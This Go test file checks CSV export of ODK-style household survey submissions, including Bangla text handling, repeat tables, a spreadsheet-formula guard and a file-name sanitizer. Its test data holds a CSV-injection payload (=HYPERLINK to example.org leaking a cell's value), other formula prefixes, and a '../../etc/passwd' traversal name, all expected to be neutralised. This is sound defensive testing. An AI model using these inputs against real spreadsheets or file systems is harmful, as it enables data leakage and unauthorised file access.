package export

import (
	"bytes"
	"io"
	"strings"
	"testing"

	"github.com/obhijatra/obhijatra/server/internal/xform"
)

// The same household form as xform's tests, as pyxform writes it.
const form = `<h:html xmlns="http://www.w3.org/2002/xforms" xmlns:h="http://www.w3.org/1999/xhtml" xmlns:jr="http://openrosa.org/javarosa">
 <h:head><model>
  <instance><data id="household_visit" version="2026110601">
   <respondent><name/><age/></respondent><location/>
   <members jr:template=""><member_name/><phones jr:template=""><phone/></phones></members>
   <needs><which/></needs><photo/><meta><instanceID/></meta>
  </data></instance>
  <bind nodeset="/data/respondent/age" type="int"/>
  <bind nodeset="/data/location" type="geopoint"/>
  <bind nodeset="/data/photo" type="binary"/>
 </model></h:head>
 <h:body>
  <group ref="/data/members"><repeat nodeset="/data/members">
   <input ref="member_name"/>
   <group ref="/data/members/phones"><repeat nodeset="/data/members/phones"><input ref="phone"/></repeat></group>
  </repeat></group>
  <group ref="/data/needs"><select ref="which"/></group>
 </h:body>
</h:html>`

// Bangla with conjuncts (ন্ত, ক্ষ) and the zero-width joiner of র\u200d্য, which
// must come out byte for byte.
const banglaName = "অন্তরা ক্ষমা র\u200d্যাব"

const instance = `<?xml version="1.0"?>
<data id="household_visit" version="2026110601">
 <respondent><name>` + banglaName + `</name><age>34</age></respondent>
 <location>23.8103 90.4125 10 5</location>
 <members><member_name>করিম</member_name>
  <phones><phone>+8801712345678</phone></phones>
  <phones><phone>=HYPERLINK("http://example.org/?"&amp;A1)</phone></phones>
 </members>
 <members><member_name>সালমা, "খাতুন"</member_name></members>
 <needs><which>food water</which></needs>
 <photo>1700000000.jpg</photo>
 <meta><instanceID>uuid:abc</instanceID></meta>
 <not_in_form>ignored</not_in_form>
</data>`

func build(t *testing.T) (*Tables, map[string]*bytes.Buffer) {
	t.Helper()
	fields, err := xform.ParseFields(strings.NewReader(form))
	if err != nil {
		t.Fatal(err)
	}
	files := map[string]*bytes.Buffer{}
	tables, err := NewTables("household_visit", fields, func(name string) (io.Writer, error) {
		files[name] = &bytes.Buffer{}
		return files[name], nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return tables, files
}

func TestTablesFollowODKCentral(t *testing.T) {
	tables, files := build(t)
	err := tables.Add(strings.NewReader(instance), Metadata{
		SubmissionDate: "2026-11-06T09:00:00.000Z", InstanceID: "uuid:abc",
		SubmitterID: "fieldid", SubmitterName: "Field One",
		AttachmentsPresent: 1, AttachmentsExpected: 1, ReviewState: "hasIssues",
		DeviceID: "dev1", FormVersion: "2026110601",
	})
	if err != nil {
		t.Fatal(err)
	}
	if err := tables.Flush(); err != nil {
		t.Fatal(err)
	}

	want := map[string]string{
		"household_visit.csv": "\ufeff" +
			"SubmissionDate,respondent-name,respondent-age,location-Latitude,location-Longitude,location-Altitude,location-Accuracy,needs-which,photo,meta-instanceID,KEY,SubmitterID,SubmitterName,AttachmentsPresent,AttachmentsExpected,Status,ReviewState,DeviceID,Edits,FormVersion\r\n" +
			"2026-11-06T09:00:00.000Z," + banglaName + ",34,23.8103,90.4125,10,5,food water,1700000000.jpg,uuid:abc,uuid:abc,fieldid,Field One,1,1,,hasIssues,dev1,0,2026110601\r\n",
		"household_visit-members.csv": "\ufeff" +
			"member_name,PARENT_KEY,KEY\r\n" +
			"করিম,uuid:abc,uuid:abc/members[1]\r\n" +
			`"সালমা, ""খাতুন""",uuid:abc,uuid:abc/members[2]` + "\r\n",
		"household_visit-phones.csv": "\ufeff" +
			"phone,PARENT_KEY,KEY\r\n" +
			"+8801712345678,uuid:abc/members[1],uuid:abc/members[1]/phones[1]\r\n" +
			`"'=HYPERLINK(""http://example.org/?""&A1)",uuid:abc/members[1],uuid:abc/members[1]/phones[2]` + "\r\n",
	}
	if len(files) != len(want) {
		t.Errorf("files %v", keys(files))
	}
	for name, w := range want {
		if got := files[name].String(); got != w {
			t.Errorf("%s:\n got %q\nwant %q", name, got, w)
		}
	}
	if !bytes.Contains(files["household_visit.csv"].Bytes(), []byte(banglaName)) {
		t.Error("the Bangla name did not come out byte for byte")
	}
}

func TestMediaNamesComeFromBinaryQuestions(t *testing.T) {
	tables, _ := build(t)
	names, err := tables.MediaNames(strings.NewReader(instance))
	if err != nil || len(names) != 1 || names[0] != "1700000000.jpg" {
		t.Errorf("media names %v %v", names, err)
	}
}

func TestRepeatNamesThatClashGetNumbers(t *testing.T) {
	fields := []xform.Field{
		{Path: "/a", Name: "a", Kind: xform.KindStructure},
		{Path: "/a/item", Name: "item", Kind: xform.KindRepeat},
		{Path: "/a/item/x", Name: "x", Kind: xform.KindValue, Type: "string"},
		{Path: "/b", Name: "b", Kind: xform.KindStructure},
		{Path: "/b/item", Name: "item", Kind: xform.KindRepeat},
		{Path: "/b/item/y", Name: "y", Kind: xform.KindValue, Type: "string"},
	}
	var names []string
	if _, err := NewTables("f", fields, func(name string) (io.Writer, error) {
		names = append(names, name)
		return io.Discard, nil
	}); err != nil {
		t.Fatal(err)
	}
	if strings.Join(names, " ") != "f.csv f-item~1.csv f-item~2.csv" {
		t.Errorf("names %v", names)
	}
}

func TestFormulaGuard(t *testing.T) {
	for in, want := range map[string]string{
		"=1+1": "'=1+1", "+cmd": "'+cmd", "-2+3": "'-2+3", "@SUM(A1)": "'@SUM(A1)", "\tx": "'\tx",
		"-12.5": "-12.5", "+8801712345678": "+8801712345678", "": "", "রহিমা": "রহিমা", "a=b": "a=b",
	} {
		if got := GuardFormula(in); got != want {
			t.Errorf("GuardFormula(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestSafeName(t *testing.T) {
	for in, want := range map[string]string{
		"household_visit": "household_visit", "a/b\\c:d*e?f\"g<h>i|j": "abcdefghij",
		"../../etc/passwd": "etcpasswd", "CON": "_CON", "  .hidden. ": "hidden", "": "_",
		"ছবি.jpg": "ছবি.jpg",
	} {
		if got := SafeName(in); got != want {
			t.Errorf("SafeName(%q) = %q, want %q", in, got, want)
		}
	}
}

func keys(m map[string]*bytes.Buffer) []string {
	var k []string
	for n := range m {
		k = append(k, n)
	}
	return k
}
